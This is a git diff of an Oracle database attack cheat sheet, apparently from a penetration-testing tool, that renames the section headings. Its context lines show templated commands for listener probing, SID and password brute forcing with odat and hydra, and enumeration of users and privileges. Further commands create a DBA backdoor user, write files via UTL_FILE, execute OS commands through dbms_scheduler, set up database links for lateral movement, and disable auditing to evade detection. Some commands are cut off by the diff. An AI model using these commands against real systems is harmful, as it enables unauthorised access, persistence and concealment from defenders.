@@ -4,7 +4,7 @@
 
 ---
 
-## TNS Listener Version Probe
+## probe tns listener version
 Get TNS listener version with tnscmd10g.
 
 ```bash
@@ -15,7 +15,7 @@ tnscmd10g version -h {{TARGET:ip}} -p {{PORT:port:1521}}
 
 ---
 
-## TNS Listener Status
+## check tns listener status
 Check TNS listener status (poisoning indicator).
 
 ```bash
@@ -26,7 +26,7 @@ tnscmd10g -h {{TARGET:ip}} -p {{PORT:port:1521}} status
 
 ---
 
-## SID Brute Force with odat
+## brute SID odat
 Brute force Oracle Service Identifier using odat.
 
 ```bash
@@ -37,7 +37,7 @@ odat sidguesser -s {{TARGET:ip}} -p {{PORT:port:1521}}
 
 ---
 
-## Connect with sqlplus
+## connect sqlplus
 Connect to Oracle using SQL*Plus client.
 
 ```bash
@@ -48,7 +48,7 @@ sqlplus {{USERNAME:str}}/{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:1521}}/{{SER
 
 ---
 
-## Connect as SYSDBA
+## connect sysdba privesc
 Connect with full administrative privileges (requires sys credentials).
 
 ```sql
@@ -59,7 +59,7 @@ CONNECT sys/{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:1521}}/{{SERVICE_NAME:str
 
 ---
 
-## Brute Force Oracle Passwords
+## brute login SID hydra
 Hydra brute force against Oracle SID.
 
 ```bash
@@ -70,7 +70,7 @@ hydra -L {{USERS_FILE:file:users.txt}} -P {{PASSWORDS_FILE:file:passwords.txt}} 
 
 ---
 
-## Get Oracle Version
+## get version
 Identify Oracle DB version for CVE matching.
 
 ```sql
@@ -81,7 +81,7 @@ SELECT * FROM v$version;
 
 ---
 
-## List All Users and Roles
+## list users roles
 Enumerate users and their granted roles.
 
 ```sql
@@ -93,7 +93,7 @@ SELECT username, granted_role FROM dba_role_privs;
 
 ---
 
-## List All Tables
+## list tables
 Enumerate accessible tables.
 
 ```sql
@@ -104,7 +104,7 @@ SELECT table_name FROM all_tables;
 
 ---
 
-## Describe Table
+## describe table columns
 Show columns and types of a specific table.
 
 ```sql
@@ -115,7 +115,7 @@ DESC {{TABLE:str}};
 
 ---
 
-## Find Public Privileges (Misconfigs)
+## find public privileges misconfig
 Identify tables granted to PUBLIC role.
 
 ```sql
@@ -126,7 +126,7 @@ SELECT table_name, privilege FROM all_tab_privs WHERE grantee = 'PUBLIC';
 
 ---
 
-## Find Vulnerable PL/SQL Packages
+## find vulnerable plsql packages
 Identify UTL_FILE / UTL_HTTP packages for exploitation.
 
 ```sql
@@ -137,7 +137,7 @@ SELECT owner, object_name FROM all_objects WHERE object_type = 'PACKAGE' AND obj
 
 ---
 
-## Create Privileged User Backdoor
+## create backdoor user dba
 Create user with DBA role for persistent access.
 
 ```sql
@@ -149,7 +149,7 @@ GRANT DBA TO {{USERNAME:str:hacker}};
 
 ---
 
-## File Write via UTL_FILE
+## write file utl_file
 Write arbitrary file using UTL_FILE PL/SQL package.
 
 ```sql
@@ -160,7 +160,7 @@ DECLARE v_file UTL_FILE.FILE_TYPE; BEGIN v_file := UTL_FILE.FOPEN('/tmp', 'pwn.t
 
 ---
 
-## OS Command Execution via dbms_scheduler
+## exec os command dbms_scheduler
 Run shell commands through Oracle scheduler job.
 
 ```sql
@@ -171,7 +171,7 @@ EXEC dbms_scheduler.create_job(job_name => 'pwn_job', job_type => 'EXECUTABLE', 
 
 ---
 
-## Create Database Link for Lateral Movement
+## create db link lateral
 Establish DB link to remote Oracle instance.
 
 ```sql
@@ -182,7 +182,7 @@ CREATE DATABASE LINK {{LINK_NAME:str:remote_link}} CONNECT TO {{USERNAME:str}} I
 
 ---
 
-## Disable Auditing
+## disable auditing evasion
 Turn off auditing to evade detection.
 
 ```sql
@@ -193,7 +193,7 @@ NOAUDIT ALL;
 
 ---
 
-## msdat - Comprehensive Enumeration
+## enum all odat
 Use msdat to enumerate everything on MSSQL/Oracle (multi-module).
 
 ```bash
